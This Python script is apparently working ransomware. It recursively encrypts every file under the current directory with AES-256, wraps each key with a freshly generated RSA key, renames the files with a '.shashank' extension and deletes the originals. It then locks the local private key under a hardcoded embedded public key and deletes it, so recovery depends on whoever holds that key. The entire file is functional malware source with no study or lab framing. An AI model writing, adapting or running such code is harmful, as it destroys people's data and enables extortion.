import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

# Generate a random AES key
def generate_aes_key():
    return os.urandom(32)  # 256-bit key

# AES encryption
def encrypt_file_aes(key, file_data):
    iv = os.urandom(16)  # Initialization Vector (IV)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Padding to make the plaintext a multiple of block size (16 bytes)
    padder = sym_padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(file_data) + padder.finalize()

    ciphertext = encryptor.update(padded_data) + encryptor.finalize()

    return iv + ciphertext  # Prepend IV to ciphertext for decryption

# Generate RSA public/private keys
def generate_rsa_keys():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    # Save the private key to a file (you can load it back for decryption)
    with open('private_key.pem', 'wb') as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))

    return private_key, public_key

# Encrypt AES key using RSA
def encrypt_aes_key_rsa(public_key, aes_key):
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_aes_key

# Encrypt a real file in place with .shashank extension
def encrypt_real_file(input_file, public_key):
    # Read the content of the file
    with open(input_file, 'rb') as f:
        file_data = f.read()

    # Step 1: Generate AES key
    aes_key = generate_aes_key()

    # Step 2: Encrypt the file using AES
    encrypted_data = encrypt_file_aes(aes_key, file_data)

    # Step 3: Encrypt the AES key using RSA
    encrypted_aes_key = encrypt_aes_key_rsa(public_key, aes_key)

    # Step 4: Write encrypted AES key and encrypted file data back to the original file with .shashank extension
    encrypted_file_name = f"{input_file}.shashank"
    with open(encrypted_file_name, 'wb') as f:
        f.write(encrypted_aes_key + encrypted_data)

    # Optional: Remove the original file
    os.remove(input_file)
    print(f"File '{input_file}' has been encrypted and saved as '{encrypted_file_name}'.")

# Encrypt all files in a directory
def encrypt_all_files_in_directory(directory, public_key):
    # Files to exclude (such as private_key.pem)
    exclude_files = ['private_key.pem']

    # Traverse the directory
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file in exclude_files:  # Skip excluded files
                continue
            input_file = os.path.join(root, file)
            encrypt_real_file(input_file, public_key)

# Load the public key
public_key_pem = b"""
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsVYJofpm5+LLk1/7pZTv
dcuOTs3N3V04cVslLIpBK3b2+83DyiZoXtrZ3iq1DGEiwHuMatbA+qCDjMiEGFFj
mp3KzfpC4qv7DWrLwNkbjzH6dq/6K9xFJG4hQ3r3UhXc18mwvthRclLO70SKuluq
klhxr4sBv6K4Zcm5oMA6CBgAnCzvJJoj4gj2XtYzAmP6gSWDKBtcupQNh5uh4Oav
Rft9wW8K1spYUeRJWTHjy/EgnxwPfoNQcywA4+h1nq+oMGkfIgnaBA/DKVpo+sx6
eVI8tKHL/ktK5aRjRmB20spohJ50HIR6Ociuv8yrR9DachiXAxyH1F7ta9mBCBr8
awIDAQAB
-----END PUBLIC KEY-----
"""

def load_public_key(pem_data):
    return serialization.load_pem_public_key(pem_data, backend=default_backend())

def encrypt_file(file_path, public_key):
    # Generate a random AES key
    aes_key = os.urandom(32)  # AES-256
    iv = os.urandom(16)  # Initialization vector

    # Read the file contents
    with open(file_path, 'rb') as file:
        plaintext = file.read()

    # Encrypt the file contents using AES
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Pad the plaintext to be a multiple of the block size
    padding_length = 16 - (len(plaintext) % 16)
    padded_plaintext = plaintext + bytes([padding_length] * padding_length)
    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()

    # Encrypt the AES key with RSA
    encrypted_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Write the encrypted AES key, IV, and ciphertext to a file
    with open('private_key_encrypted.bin', 'wb') as enc_file:
        enc_file.write(encrypted_key)
        enc_file.write(iv)
        enc_file.write(ciphertext)

    # Delete the original private key file
    os.remove('private_key.pem')  # Ensure the private key is deleted
    print("Private key has been encrypted and deleted.")

def main():
    directory = '.'  # Directory to scan and encrypt all files (current directory by default)

    # Step 1: Generate RSA keys
    private_key, public_key = generate_rsa_keys()

    # Step 2: Encrypt all files in the directory except the private key
    encrypt_all_files_in_directory(directory, public_key)

    # Step 3: Encrypt the private key also
    public_key = load_public_key(public_key_pem)
    
    # Encrypt the private key
    encrypt_file('private_key.pem', public_key)

if __name__ == "__main__":
    main()
